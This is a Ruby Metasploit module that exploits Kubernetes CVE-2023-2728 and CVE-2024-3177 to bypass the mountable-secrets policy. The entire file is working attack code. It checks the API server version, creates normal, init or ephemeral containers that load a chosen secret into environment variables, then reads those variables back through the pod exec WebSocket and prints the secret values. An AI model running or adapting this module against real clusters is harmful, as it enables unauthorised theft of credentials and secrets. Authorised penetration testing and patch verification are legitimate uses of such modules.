require 'faye/websocket'
require 'eventmachine'
require 'json'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Kubernetes

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Kubernetes CVE-2023-2728 and CVE-2024-3177 Exploit',
      'Description'    => %q{
        This module exploits vulnerabilities in Kubernetes (CVE-2023-2728 and CVE-2024-3177) that allow 
        bypassing the mountable secrets policy.
      },
      'Author'         => ['Carlos González'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2023-2728'],
        ['CVE', '2024-3177']
      ]
    ))

    register_options([
      OptString.new('TARGET_URI', [true, 'The base path to the Kubernetes API', '/api/v1']),
      OptString.new('NAMESPACE', [true, 'The namespace where the pod will be created', 'default']),
      OptString.new('POD_NAME', [true, 'The name of the pod to create', 'exploit-pod']),
      OptString.new('IMAGE', [true, 'The image to use for the pod', 'busybox']),
      OptString.new('SECRET_NAME', [true, 'The name of the secret to bypass']),
      OptString.new('CONTAINER_TYPE', [true, 'Type of container: normal, init, ephemeral', 'normal']),
      OptString.new('SESSION', [false, 'The session does not matter in this module']),
      OptString.new('TOKEN', [true, 'The authentication token']),
      OptEnum.new('CVE', [true, 'Select the CVE to exploit', '2024-3177', ['2024-3177', '2023-2728']])
    ])
  end

def run
  token_info = decode_token(datastore['TOKEN'])
  sa_name = token_info['kubernetes.io']['serviceaccount']['name']
  namespace_name = datastore['NAMESPACE']

  server_version = get_server_version
  unless vulnerable_version?(server_version)
    print_error("The kube-apiserver version #{server_version} is not vulnerable to the selected CVE.")
    return
  end
  print_good("The kube-apiserver version #{server_version} is vulnerable to the selected CVE.")

  if datastore['CVE'] == '2023-2728'
    if datastore['CONTAINER_TYPE'] == 'ephemeral'
      pod_status = create_normal_pod(namespace_name, sa_name)
      if pod_status == :exists_but_differs
      print_error("Pod #{datastore['POD_NAME']} exists but with a different spec. Exiting...")
      return
      elsif pod_status == :exists_and_matches
      print_status("Pod #{datastore['POD_NAME']} is already created, continuing...")
      elsif pod_status == :error
      print_error("An error occurred while managing the pod. Exiting...")
      return
    end
      wait_for_pod_ready
      add_ephemeral_container_with_secrets
    elsif datastore['CONTAINER_TYPE'] == 'normal'
      create_pod_with_secrets(namespace_name, sa_name)
      #wait_for_pod_ready
      #get_env_vars
    elsif datastore['CONTAINER_TYPE'] == 'init'
      print_status("This container type is patched in this CVE, try to select another one")
    end
  else # CVE-2024-3177
    pod_status = create_pod(namespace_name, sa_name)

    if pod_status == :exists_but_differs
      return
    elsif pod_status == :exists_and_matches
      print_status("Pod #{datastore['POD_NAME']} is already created, continuing...")
    elsif pod_status == :error
      print_error("An error occurred while managing the pod. Exiting...")
      return
    end

    if datastore['CONTAINER_TYPE'] == 'init'
      print_status("Waiting for the init container to start...")
      sleep(10)
      get_env_vars_from_init
    elsif datastore['CONTAINER_TYPE'] == 'ephemeral'
      wait_for_pod_ready
      add_ephemeral_container
      wait_for_ephemeral_container
      get_env_vars_from_ephemeral
    else
      wait_for_pod_ready
      get_env_vars
    end
  end
end

def decode_token(token)
    header, payload, signature = token.split('.')
    decoded_payload = Base64.decode64(payload.tr('-_', '+/'))
    JSON.parse(decoded_payload)
  rescue StandardError => e
    print_error("Failed to decode token: #{e.message}")
    {}
  end
  
 def get_server_version
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])

  print_status("Fetching Kubernetes server version...")

  begin
    version_info = k8sclient.get_version
    if version_info
      git_version = version_info[:gitVersion]
      print_good("Kubernetes server version: #{git_version}")
      return git_version
    else
      print_error("Failed to retrieve Kubernetes server version.")
      fail_with(Failure::Unknown, "Failed to retrieve Kubernetes server version")
    end
  rescue => e
    print_error("Error fetching Kubernetes server version: #{e.message}")
    fail_with(Failure::Unknown, "Error fetching Kubernetes server version")
  end
end


  def vulnerable_version?(version)
    vulnerable_versions = case datastore['CVE']
    when '2024-3177'
      [
        /^v1\.29\.[0-3]$/,
        /^v1\.28\.[0-8]$/,
        /^v1\.27\.\d$|^v1\.27\.1[0-2]$/
      ]
    when '2023-2728'
      [
        /^v1\.24\.14$/,
        /^v1\.25\.[0-9]$|^v1\.25\.10$/,
        /^v1\.26\.[0-5]$/,
        /^v1\.27\.[0-2]$/
      ]
    else
      []
    end
    vulnerable_versions.any? { |v| version =~ v }
  end

 #CVE 2023-2728

def create_normal_pod(namespace_name, sa_name)
  print_status("Creating pod with standard configuration in namespace: #{namespace_name} with service account: #{sa_name}")

  container_spec = {
    name: 'exploit-container',
    image: datastore['IMAGE'],
    command: ["/bin/sh"],
    args: ["-c", "sleep 3600"]
  }

  pod_spec = {
    apiVersion: 'v1',
    kind: 'Pod',
    metadata: {
      name: datastore['POD_NAME'],
      namespace: namespace_name
    },
    spec: {
      serviceAccountName: sa_name,
      containers: [container_spec],
      restartPolicy: 'Never'
    }
  }

  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])

  begin
    existing_pod = k8sclient.get_pod(datastore['POD_NAME'], namespace_name)

    normalized_existing_pod_spec = normalize_pod_spec(existing_pod[:spec])
    normalized_existing_pod_spec.delete(:ephemeralContainers)

    normalized_current_pod_spec = normalize_pod_spec(pod_spec[:spec])

    #print_status("Existing Pod Spec: #{normalized_existing_pod_spec.to_json}")
    #print_status("Current Pod Spec: #{normalized_current_pod_spec.to_json}")

    if normalized_existing_pod_spec == normalized_current_pod_spec
      #print_status("Pod #{datastore['POD_NAME']} is already created, continuing...")
      return :exists_and_matches
    else
      #print_error("Pod #{datastore['POD_NAME']} exists but with a different spec. Exiting...")
      return :exists_but_differs
    end
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::NotFoundError
    print_status("Pod not found. Proceeding with pod creation.")
  rescue => e
    print_error("Error checking pod existence: #{e.message}")
    print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
    return :error
  end

  response = k8sclient.create_pod(pod_spec, namespace_name)

  if response && response[:metadata]
    print_good("Successfully created pod #{datastore['POD_NAME']} in namespace #{namespace_name}")
  elsif response && response[:status] == 409
    print_status("Pod #{datastore['POD_NAME']} already exists, continuing...")
  else
    print_error("Failed to create pod: #{response[:status]} #{response[:body]}")
  end
end



def add_ephemeral_container_with_secrets
    print_status("Attempting to add ephemeral container to access secrets...")
  
    secret_keys = get_secret_keys(datastore['SECRET_NAME'], datastore['NAMESPACE'])
  
    if secret_keys.nil? || secret_keys.empty?
      print_error("No keys found in the specified secret.")
      return
    end
  
    env_vars = secret_keys.map do |key|
      {
        name: key,
        valueFrom: {
          secretKeyRef: {
            name: datastore['SECRET_NAME'],
            key: key
          }
        }
      }
    end
  
    uri = normalize_uri(datastore['TARGET_URI'], 'namespaces', datastore['NAMESPACE'], 'pods', datastore['POD_NAME'], 'ephemeralcontainers')
    token = datastore['TOKEN']
  
    ephemeral_container_spec = {
      name: 'ephemeral-container',
      image: datastore['IMAGE'],
      command: ["/bin/sh"],
      args: ["-c", "sleep 3600"],
      env: env_vars 
    }
  
    patch_data = {
      spec: {
        ephemeralContainers: [ephemeral_container_spec]
      }
    }
  
    headers = {
      'Authorization' => "Bearer #{token}",
      'Content-Type' => 'application/strategic-merge-patch+json'
    }
  
    print_status("Performing PATCH request with the following data: #{patch_data.to_json}")
  
    response = send_request_cgi({
      'method' => 'PATCH',
      'uri' => uri,
      'ctype' => 'application/strategic-merge-patch+json',
      'data' => patch_data.to_json,
      'headers' => headers
    })
    if response
      print_good("Response received")
      if response.code == 200
        print_good("Ephemeral container successfully added to pod #{datastore['POD_NAME']}")
        wait_for_ephemeral_container
        access_secrets_in_ephemeral_container
      else
        print_error("Error adding ephemeral container: #{response.code} #{response.message}")
        begin
          error_details = JSON.parse(response.body)
          print_error("Error details: #{error_details['message']}")
          print_error("Error code: #{error_details['code']}")
          print_error("Error status: #{error_details['status']}")
          print_error("Error reason: #{error_details['reason']}")
        rescue JSON::ParserError => e
          print_error("Failed to parse error details: #{e.message}")
        end
      end
    else
      print_error("No response received from server")
    end
  end

def create_pod_with_secrets(namespace_name, sa_name)
  print_status("Creating pod with secrets mounted in namespace: #{namespace_name} with service account: #{sa_name}")

  secret_keys = get_secret_keys(datastore['SECRET_NAME'], namespace_name)
  env_vars = secret_keys.map do |key|
    {
      name: key,
      valueFrom: {
        secretKeyRef: {
          name: datastore['SECRET_NAME'],
          key: key
        }
      }
    }
  end

  container_spec = {
    name: 'exploit-container',
    image: datastore['IMAGE'],
    command: ["/bin/sh"],
    args: ["-c", "sleep 3600"],
    env: env_vars
  }

  pod_spec = {
    apiVersion: 'v1',
    kind: 'Pod',
    metadata: {
      name: datastore['POD_NAME'],
      namespace: namespace_name
    },
    spec: {
      serviceAccountName: sa_name,
      containers: [container_spec],
      restartPolicy: 'Never'
    }
  }

  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])

  begin
    response = k8sclient.create_pod(pod_spec, namespace_name)
    if response && response[:metadata]
      print_good("Successfully created pod #{datastore['POD_NAME']} in namespace #{namespace_name}")
    end
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ForbiddenError => e
    print_error("The service account #{sa_name} does not have the appropriate permissions to access the service. Only secrets referenced by that service account can be mounted.")
  rescue => e
    print_error("Failed to create pod: #{e.message}")
  end
end


def create_pod(namespace_name, sa_name)
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])
  container_name = case datastore['CONTAINER_TYPE']
                   when 'init'
                     'init-main-container'
                   when 'ephemeral'
                     'ephemeral-main-container'
                   else
                     'main-container'
                   end
  container_spec = {
    name: 'exploit-container',
    image: datastore['IMAGE'],
    command: ["/bin/sh"],
    args: ["-c", "sleep 3600"],
    envFrom: [
      {
        secretRef: {
          name: datastore['SECRET_NAME']
        }
      }
    ]
  }

  pod_spec = {
    apiVersion: 'v1',
    kind: 'Pod',
    metadata: {
      name: datastore['POD_NAME'],
      namespace: namespace_name
    },
    spec: {
      containers: [{
        name: container_name,
        image: 'busybox',
        command: ["/bin/sh"],
        args: ["-c", "sleep 3600"]
      }],
      restartPolicy: 'Never'
    }
  }

  # Add init container if specified
  if datastore['CONTAINER_TYPE'] == 'init'
    pod_spec[:spec][:initContainers] = [container_spec]
  end
   if datastore['CONTAINER_TYPE'] == 'normal'
    pod_spec[:spec][:containers].first[:envFrom] = [
      {
        secretRef: {
          name: datastore['SECRET_NAME']
        }
      }
    ]
  end

  print_status("Creating pod with the following spec: #{pod_spec.to_json}")

  begin
    # Verificar si el pod ya existe
    existing_pod = k8sclient.get_pod(datastore['POD_NAME'], namespace_name)
    if existing_pod
      existing_pod_spec = normalize_pod_spec(existing_pod[:spec])
      existing_pod_spec.delete(:initContainers)
      existing_pod_spec.delete(:ephemeralContainers)
      current_pod_spec = normalize_pod_spec(pod_spec[:spec])
      current_pod_spec.delete(:initContainers)
      current_pod_spec.delete(:ephemeralContainers)
      matching = existing_pod_spec == current_pod_spec
      

      if matching
        print_status("matchea el existing #{existing_pod_spec}")
        print_status("Pod 2 current #{current_pod_spec}")
        return :exists_and_matches
      else
        #print_status("EXISTING POD #{existing_pod_spec}")
        #print_status("CURRENT POD #{current_pod_spec}")
        print_error("Pod #{datastore['POD_NAME']} exists but with a different spec. Exiting...")
        return :exists_but_differs
      end
    end
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::NotFoundError
    print_status("Pod not found, creating a new one.")
  rescue => e
    print_error("Error checking pod existence: #{e.message}")
    print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
    return :error
  end

  begin
    response = k8sclient.create_pod(pod_spec, namespace_name)
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::UnexpectedStatusCode => e
    if e.status_code == 409
      return :exists_and_matches
      print_error("Error in create_pod: #{e.message}")
      print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
      return :error
    end
  rescue => e
    print_error("Error in create_pod: #{e.message}")
    print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
    return :error
  end

  if response && response[:metadata]
    print_good("Pod created successfully: #{response[:metadata][:name]}")
    return :created
  else
    print_error("Failed to create pod.")
    return :error
  end
end


def normalize_pod_spec(spec)
  normalized_spec = spec.dup

  normalized_spec.delete(:volumes)
  normalized_spec.delete(:serviceAccountName)
  normalized_spec.delete(:serviceAccount)
  normalized_spec.delete(:nodeName)
  normalized_spec.delete(:schedulerName)
  normalized_spec.delete(:tolerations)
  normalized_spec.delete(:dnsPolicy)
  normalized_spec.delete(:terminationGracePeriodSeconds)
  normalized_spec.delete(:securityContext)
  normalized_spec.delete(:imagePullPolicy)
  normalized_spec.delete(:enableServiceLinks)
  normalized_spec.delete(:preemptionPolicy)
  normalized_spec.delete(:priority)
  
  normalized_spec[:containers].each do |container|
    container.delete(:volumeMounts)
    container.delete(:resources)
    container.delete(:terminationMessagePath)
    container.delete(:terminationMessagePolicy)
    container.delete(:imagePullPolicy)
  end

  normalized_spec
end


def wait_for_pod_ready
  token = datastore['TOKEN']
  namespace = datastore['NAMESPACE']
  pod_name = datastore['POD_NAME']

  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: token)

  print_status("Waiting for pod #{pod_name} to be ready...")

  timeout = 120
  interval = 5

  (timeout / interval).times do
    pod = k8sclient.get_pod(pod_name, namespace)
    pod_status = pod.dig(:status, :phase)

    if pod_status == 'Running'
      print_good("Pod #{pod_name} is running.")
      return
    else
      print_status("Pod #{pod_name} status: #{pod_status}")
      sleep(interval)
    end
  end

  fail_with(Failure::TimeoutExpired, "Pod #{pod_name} did not become ready within #{timeout} seconds.")
end

def add_ephemeral_container
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])

  ephemeral_container_spec = {
    name: 'ephemeral-container',
    image: datastore['IMAGE'],
    envFrom: [
      {
        secretRef: {
          name: datastore['SECRET_NAME']
        }
      }
    ],
    command: ["/bin/sh"],
    args: ["-c", "sleep 3600"]
  }

  patch_data = {
    spec: {
      ephemeralContainers: [ephemeral_container_spec]
    }
  }

  uri = normalize_uri(datastore['TARGET_URI'], 'namespaces', datastore['NAMESPACE'], 'pods', datastore['POD_NAME'], 'ephemeralcontainers')
  token = datastore['TOKEN']

  print_status("Adding ephemeral container with the following spec: #{ephemeral_container_spec.to_json}")

  response = send_request_cgi({
    'method' => 'PATCH',
    'uri' => uri,
    'ctype' => 'application/strategic-merge-patch+json',
    'data' => patch_data.to_json,
    'headers' => {
      'Authorization' => "Bearer #{token}"
    }
  })

  if response
    print_status("Ephemeral container addition response code: #{response.code}")
    print_status("Ephemeral container addition response message: #{response.message}")
  end

  if response && response.code == 200
    print_good("Successfully added ephemeral container to pod #{datastore['POD_NAME']}")
    wait_for_ephemeral_container
  else
    print_error("Failed to add ephemeral container: #{response.code} #{response.message}")
  end
end

def get_secret_keys(secret_name, namespace)
  #print_status("Fetching keys from secret '#{secret_name}' in namespace '#{namespace}'")

  uri = normalize_uri(datastore['TARGET_URI'], 'namespaces', namespace, 'secrets', secret_name)
  token = datastore['TOKEN']

  response = send_request_cgi({
    'method' => 'GET',
    'uri' => uri,
    'ctype' => 'application/json',
    'headers' => {
      'Authorization' => "Bearer #{token}"
    }
  })

  if response && response.code == 200
    secret_data = JSON.parse(response.body)
    secret_keys = secret_data['data'].keys
    #print_status("Keys available in the secret: #{secret_keys.join(', ')}")
    secret_keys
  else
    print_error("Error retrieving secret keys: #{response&.code} #{response&.message}")
    nil
  end
end

def wait_for_ephemeral_container
  token = datastore['TOKEN']
  namespace = datastore['NAMESPACE']
  pod_name = datastore['POD_NAME']

  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: token)

  print_status("Waiting for ephemeral container to be ready...")

  timeout = 300
  interval = 5

  (timeout / interval).times do
    pod = k8sclient.get_pod(pod_name, namespace)

    ephemeral_container_status = pod.dig(:status, :ephemeralContainerStatuses)&.find { |c| c[:name] == 'ephemeral-container' }

    if ephemeral_container_status && ephemeral_container_status.dig(:state, :running)
      print_good("Ephemeral container is running.")
      return
    else
      state = ephemeral_container_status ? ephemeral_container_status.dig(:state) : 'Not found'
      reason = ephemeral_container_status.dig(:state, :waiting, :reason) if ephemeral_container_status
      message = ephemeral_container_status.dig(:state, :waiting, :message) if ephemeral_container_status
      print_status("Ephemeral container status: #{state}")
      print_status("Reason: #{reason}") if reason
      print_status("Message: #{message}") if message
      sleep(interval)
    end
  end

  fail_with(Failure::TimeoutExpired, "Ephemeral container did not become ready within #{timeout} seconds.")
end

def access_secrets_in_ephemeral_container
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])
  print_status("Attempting to access environment variables from the ephemeral container...")

  secret_keys = get_secret_keys(datastore['SECRET_NAME'], datastore['NAMESPACE'])

  if secret_keys.nil? || secret_keys.empty?
    print_error("No keys found in the specified secret.")
    return
  end

  exec_command = {
    'command' => ["/bin/sh", "-c", "env"],
    'stdin' => false,
    'stdout' => true,
    'stderr' => true,
    'tty' => false
  }

  target_host_port = "#{datastore['RHOSTS']}:#{datastore['RPORT']}"
  uri = normalize_uri('api', 'v1', 'namespaces', datastore['NAMESPACE'], 'pods', datastore['POD_NAME'], 'exec')
  params = {
    'container' => 'ephemeral-container',
    'stdin' => 'false',
    'stdout' => 'true',
    'stderr' => 'true',
    'tty' => 'false',
    'command' => ['/bin/sh', '-c', 'env']
  }
  query = URI.encode_www_form(params)
  scheme = datastore['SSL'] ? 'wss' : 'ws'
  full_uri = "#{scheme}://#{target_host_port}#{uri}?#{query}"
  #print_status("Full URI: #{full_uri}")

  EventMachine.run do
    headers = {
            'Authorization' => "Bearer #{datastore['TOKEN']}"
    }

    ws = Faye::WebSocket::Client.new(full_uri, nil, { headers: headers, tls: { verify_peer: false } })

    ws.on :open do |_event|
      print_status("WebSocket connection opened")
    end

    ws.on :message do |event|
      decoded_message = decode_message(event.data)
      highlight_secrets(decoded_message, secret_keys)
    end

    ws.on :close do |event|
      print_status("WebSocket connection closed: #{event.code},     #{event.reason}")
      EventMachine.stop
    end

    ws.on :error do |event|
      print_error("WebSocket error: #{event.message}")
      EventMachine.stop
    end
  end
rescue StandardError => e
  print_error("An error occurred: #{e.message}")
  print_error("Error trace:\n\t#{e.backtrace.join("\n\t")}")
end

def get_env_vars_from_ephemeral
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])
  print_status("Retrieving environment variables from ephemeral container using Kubernetes API...")
  secret_keys = get_secret_keys(datastore['SECRET_NAME'], datastore['NAMESPACE'])
  exec_command = {
    'command' => ["/bin/sh", "-c", "printenv"],
    'stdin' => false,
    'stdout' => true,
    'stderr' => true,
    'tty' => false
  }

  target_host_port = "#{datastore['RHOSTS']}:#{datastore['RPORT']}"
  uri = normalize_uri('api', 'v1', 'namespaces', datastore['NAMESPACE'], 'pods', datastore['POD_NAME'], 'exec')
  params = {
    'container' => 'ephemeral-container',
    'stdin' => 'false',
    'stdout' => 'true',
    'stderr' => 'true',
    'tty' => 'false',
    'command' => ['/bin/sh', '-c', 'printenv']
  }
  query = URI.encode_www_form(params)
  scheme = datastore['SSL'] ? 'wss' : 'ws'
  full_uri = "#{scheme}://#{target_host_port}#{uri}?#{query}"

  EventMachine.run do
    headers = {
      'Authorization' => "Bearer #{datastore['TOKEN']}"
    }

    ws = Faye::WebSocket::Client.new(full_uri, nil, { headers: headers, tls: { verify_peer: false } })

    ws.on :open do |event|
      print_status("WebSocket connection opened")
    end

    ws.on :message do |event|
      decoded_message = decode_message(event.data)
      highlight_secrets(decoded_message, secret_keys) 
    end

    ws.on :close do |event|
      print_status("WebSocket connection closed: #{event.code}, #{event.reason}")
      EventMachine.stop
    end

    ws.on :error do |event|
      print_error("WebSocket error: #{event.message}")
      EventMachine.stop
    end
  end
rescue => e
  print_error("An error occurred: #{e.message}")
  print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
end

def get_env_vars_from_init
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])
  print_status("Checking pod and container status...")
  secret_keys = get_secret_keys(datastore['SECRET_NAME'], datastore['NAMESPACE'])
  pod = k8sclient.get_pod(datastore['POD_NAME'], datastore['NAMESPACE'])
  init_container_status = pod.dig(:status, :initContainerStatuses)&.first

  if init_container_status
    state = init_container_status.dig(:state)
    if state[:running]
      print_good("Init container is running.")
    elsif state[:terminated]
      print_error("Init container has already terminated. State: #{state[:terminated]}")
      return
    else
      print_error("Init container is not running. Current state: #{state}")
      return
    end
  else
    print_error("No init container status found.")
    return
  end

  print_status("Retrieving environment variables from init container using Kubernetes API...")

  exec_command = {
    'command' => ["/bin/sh", "-c", "printenv"],
    'stdin' => false,
    'stdout' => true,
    'stderr' => true,
    'tty' => false
  }

  target_host_port = "#{datastore['RHOSTS']}:#{datastore['RPORT']}"
  uri = normalize_uri('api', 'v1', 'namespaces', datastore['NAMESPACE'], 'pods', datastore['POD_NAME'], 'exec')
  params = {
    'container' => 'exploit-container',
    'stdin' => 'false',
    'stdout' => 'true',
    'stderr' => 'true',
    'tty' => 'false',
    'command' => ['/bin/sh', '-c', 'printenv']
  }

  query = URI.encode_www_form(params)
  scheme = datastore['SSL'] ? 'wss' : 'ws'
  full_uri = "#{scheme}://#{target_host_port}#{uri}?#{query}"

  EventMachine.run do
    headers = {
      'Authorization' => "Bearer #{datastore['TOKEN']}"
    }

    ws = Faye::WebSocket::Client.new(full_uri, nil, { headers: headers, tls: { verify_peer: false } })

    ws.on :open do |event|
      print_status("WebSocket connection opened")
    end

    ws.on :message do |event|
      decoded_message = decode_message(event.data)
      highlight_secrets(decoded_message, secret_keys)
    end

    ws.on :close do |event|
      print_status("WebSocket connection closed: #{event.code}, #{event.reason}")
      EventMachine.stop
    end

    ws.on :error do |event|
      print_error("WebSocket error: #{event.message}")
      EventMachine.stop
    end
  end
rescue => e
  print_error("An error occurred: #{e.message}")
  print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
end

def highlight_secrets(message, secret_keys)
  message.each_line do |line|
    if secret_keys.any? { |secret| line.start_with?(secret) }
      # Resaltar en rojo usando secuencias ANSI
      print_line("\e[31m#{line.strip}\e[0m")
    else
      print_line(line.strip)
    end
  end
end

def decode_message(data)
  if data.is_a?(Array)
    data.map(&:chr).join
  else
    data.to_s
  end
end

def get_env_vars
  k8sclient = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new(http_client: self, token: datastore['TOKEN'])
  print_status("Established Kubernetes client.")
  secret_keys = get_secret_keys(datastore['SECRET_NAME'], datastore['NAMESPACE'])

  result = k8sclient.exec_pod_capture(
    datastore['POD_NAME'],
    datastore['NAMESPACE'],
    ["/bin/sh", "-c", "printenv"],
    'stdin' => false,
    'stdout' => true,
    'stderr' => true,
    'tty' => false
  ) do |stdout, stderr|
    highlight_secrets(stdout.strip, secret_keys) unless stdout.blank?
    highlight_secrets(stderr.strip, secret_keys) unless stderr.blank?
  end

  if result
    status = result&.dig(:error, 'status')
    if status == 'Success'
      print_good("Successfully retrieved environment variables from pod #{datastore['POD_NAME']}")
    else
      fail_with(Failure::Unknown, "Status: #{status || 'Unknown'}")
    end
  else
    fail_with(Failure::Unknown, 'Failed to execute the command')
  end
rescue Rex::Proto::Http::WebSocket::ConnectionError => e
  res = e.http_response
  if res.nil?
    fail_with(Failure::Unreachable, e.message)
  else
    print_error("WebSocket connection failed with response code: #{res.code} and message: #{res.message}")
    fail_with(Failure::NoAccess, 'Insufficient Kubernetes access') if res.code == 401 || res.code == 403
    fail_with(Failure::Unknown, e.message)
  end
rescue => e
  print_error("An error occurred: #{e.message}")
  print_error("Backtrace:\n\t#{e.backtrace.join("\n\t")}")
end
end


